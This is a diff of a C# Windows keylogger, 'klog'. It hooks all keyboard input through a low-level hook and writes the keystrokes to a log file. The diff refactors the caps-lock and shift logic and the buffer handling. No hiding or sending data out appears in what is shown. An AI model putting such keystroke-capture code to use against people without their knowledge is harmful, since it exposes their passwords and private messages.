@@ -8,7 +8,7 @@ namespace klog;
 #pragma warning disable CA1416
 public static class Program
 {
-    private const uint BufferSize = 256;
+    private const uint BufferSize = 10;
     // ReSharper disable InconsistentNaming
     private const int KEYDOWN = 0x0100;
     private const int KEYUP = 0x0101;
@@ -30,12 +30,11 @@ public static class Program
         WriteInfoToLogFile();
         
         // get caps lock state when program opens
-        _capsLockActive = GetCapsLockState();
+        _capsLockActive = !GetCapsLockState();
 
         // install a keyboard hook
         _kbHook = PInvoke.SetWindowsHookEx(
             WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardProcedure, null, 0);
-
         
         // set up message queue
         MSG msg = new();
@@ -47,6 +46,7 @@ public static class Program
         
         // clean disposable things up
         _kbHook.Close();
+        // TODO still doesnt write on close
         WriteBuffer();
         Writer.Dispose();
     }
@@ -84,7 +84,6 @@ public static class Program
         // TODO get locale with GetKeyboardLayout and alter what for example numbers return when shift is active
         // write the locale to file and only actually alter the keys' behaviour if the kb layout isn't weird with
         // what shift + numbers do otherwise assume default US kinda keyboard layout
-// TODO: instead of doing the caps lock and shift dumb shit in the switch just transform it accordingly after the switch to save like 50 lines of code
         var stringToWrite = kbStruct->vkCode switch
         {
             0x08 => " [BACKSPACE] ",
@@ -133,88 +132,32 @@ public static class Program
             0x37 => "7",
             0x38 => "8",
             0x39 => "9",
-            // pattern is:
-            // 1. no caps lock or shift (lowercase)
-            // 2. caps lock or shift (uppercase)
-            // 3. both caps lock and shift (lowercase)
-            0x41 when !_capsLockActive && !_shiftActive => "a",
-            0x41 when _capsLockActive || _shiftActive => "A",
-            0x41 when _capsLockActive && _shiftActive => "a",
-            0x42 when !_capsLockActive && !_shiftActive => "b",
-            0x42 when _capsLockActive || _shiftActive => "B",
-            0x42 when _capsLockActive && _shiftActive => "b",
-            0x43 when !_capsLockActive && !_shiftActive => "c",
-            0x43 when _capsLockActive || _shiftActive => "C",
-            0x43 when _capsLockActive && _shiftActive => "c",
-            0x44 when !_capsLockActive && !_shiftActive => "d",
-            0x44 when _capsLockActive || _shiftActive => "D",
-            0x44 when _capsLockActive && _shiftActive => "d",
-            0x45 when !_capsLockActive && !_shiftActive => "e",
-            0x45 when _capsLockActive || _shiftActive => "E",
-            0x45 when _capsLockActive && _shiftActive => "e",
-            0x46 when !_capsLockActive && !_shiftActive => "f",
-            0x46 when _capsLockActive || _shiftActive => "F",
-            0x46 when _capsLockActive && _shiftActive => "f",
-            0x47 when !_capsLockActive && !_shiftActive => "g",
-            0x47 when _capsLockActive || _shiftActive => "G",
-            0x47 when _capsLockActive && _shiftActive => "g",
-            0x48 when !_capsLockActive && !_shiftActive => "h",
-            0x48 when _capsLockActive || _shiftActive => "H",
-            0x48 when _capsLockActive && _shiftActive => "h",
-            0x49 when !_capsLockActive && !_shiftActive => "i",
-            0x49 when _capsLockActive || _shiftActive => "I",
-            0x49 when _capsLockActive && _shiftActive => "i",
-            0x4A when !_capsLockActive && !_shiftActive => "j",
-            0x4A when _capsLockActive || _shiftActive => "J",
-            0x4A when _capsLockActive && _shiftActive => "j",
-            0x4B when !_capsLockActive && !_shiftActive => "k",
-            0x4B when _capsLockActive || _shiftActive => "K",
-            0x4B when _capsLockActive && _shiftActive => "k",
-            0x4C when !_capsLockActive && !_shiftActive => "l",
-            0x4C when _capsLockActive || _shiftActive => "L",
-            0x4C when _capsLockActive && _shiftActive => "l",
-            0x4D when !_capsLockActive && !_shiftActive => "m",
-            0x4D when _capsLockActive || _shiftActive => "M",
-            0x4D when _capsLockActive && _shiftActive => "m",
-            0x4E when !_capsLockActive && !_shiftActive => "n",
-            0x4E when _capsLockActive || _shiftActive => "N",
-            0x4E when _capsLockActive && _shiftActive => "n",
-            0x4F when !_capsLockActive && !_shiftActive => "o",
-            0x4F when _capsLockActive || _shiftActive => "O",
-            0x4F when _capsLockActive && _shiftActive => "o",
-            0x50 when !_capsLockActive && !_shiftActive => "p",
-            0x50 when _capsLockActive || _shiftActive => "P",
-            0x50 when _capsLockActive && _shiftActive => "p",
-            0x51 when !_capsLockActive && !_shiftActive => "q",
-            0x51 when _capsLockActive || _shiftActive => "Q",
-            0x51 when _capsLockActive && _shiftActive => "q",
-            0x52 when !_capsLockActive && !_shiftActive => "r",
-            0x52 when _capsLockActive || _shiftActive => "R",
-            0x52 when _capsLockActive && _shiftActive => "r",
-            0x53 when !_capsLockActive && !_shiftActive => "s",
-            0x53 when _capsLockActive || _shiftActive => "S",
-            0x53 when _capsLockActive && _shiftActive => "s",
-            0x54 when !_capsLockActive && !_shiftActive => "t",
-            0x54 when _capsLockActive || _shiftActive => "T",
-            0x54 when _capsLockActive && _shiftActive => "t",
-            0x55 when !_capsLockActive && !_shiftActive => "u",
-            0x55 when _capsLockActive || _shiftActive => "U",
-            0x55 when _capsLockActive && _shiftActive => "u",
-            0x56 when !_capsLockActive && !_shiftActive => "v",
-            0x56 when _capsLockActive || _shiftActive => "V",
-            0x56 when _capsLockActive && _shiftActive => "v",
-            0x57 when !_capsLockActive && !_shiftActive => "w",
-            0x57 when _capsLockActive || _shiftActive => "W",
-            0x57 when _capsLockActive && _shiftActive => "w",
-            0x58 when !_capsLockActive && !_shiftActive => "x",
-            0x58 when _capsLockActive || _shiftActive => "X",
-            0x58 when _capsLockActive && _shiftActive => "x",
-            0x59 when !_capsLockActive && !_shiftActive => "y",
-            0x59 when _capsLockActive || _shiftActive => "Y",
-            0x59 when _capsLockActive && _shiftActive => "y",
-            0x5A when !_capsLockActive && !_shiftActive => "z",
-            0x5A when _capsLockActive || _shiftActive => "Z",
-            0x5A when _capsLockActive && _shiftActive => "z",
+            0x41 => "a",
+            0x42 => "b",
+            0x43 => "c",
+            0x44 => "d",
+            0x45 => "e",
+            0x46 => "f",
+            0x47 => "g",
+            0x48 => "h",
+            0x49 => "i",
+            0x4A => "j",
+            0x4B => "k",
+            0x4C => "l",
+            0x4D => "m",
+            0x4E => "n",
+            0x4F => "o",
+            0x50 => "p",
+            0x51 => "q",
+            0x52 => "r",
+            0x53 => "s",
+            0x54 => "t",
+            0x55 => "u",
+            0x56 => "v",
+            0x57 => "w",
+            0x58 => "x",
+            0x59 => "y",
+            0x5A => "z",
             0x5B => "\n[LEFT WINDOWS KEY] ",
             0x5C => "\n[RIGHT WINDOWS KEY] ",
             0x5D => "\n[APPLICATIONS KEY] ",
@@ -311,6 +254,15 @@ public static class Program
         // if caps lock or shift were pressed, set their fields
         if (kbStruct->vkCode == 0x14) _capsLockActive = !_capsLockActive;
         if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = true;
+        
+        if (kbStruct->vkCode >= 0x41 && kbStruct->vkCode <= 0x5A)
+        {
+            // if either shift or caps are active but not both at the same time
+            if ((_shiftActive || _capsLockActive) && !(_shiftActive && _capsLockActive))
+            {
+                return stringToWrite.ToUpper();
+            }
+        }
 
         return stringToWrite;
     }
@@ -367,6 +319,7 @@ public static class Program
     {
         foreach (var str in Buffer) Writer.Write(str);
         Writer.Flush();
+        Buffer.Clear();
     }
     
     /// <summary>
@@ -418,5 +371,12 @@ public static class Program
                           $"If you see something like: [CODE: xxxx], you can check what key the code represents on " +
                           $"https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\n\n");
         Writer.Flush();
+    }
+    
+    private static void GetKeyboardLayout()
+    {
+        var layout = PInvoke.GetKeyboardLayout(0);
+        var lcid = layout >> 16;
+        Console.WriteLine($"{lcid:X}");
     }
 }
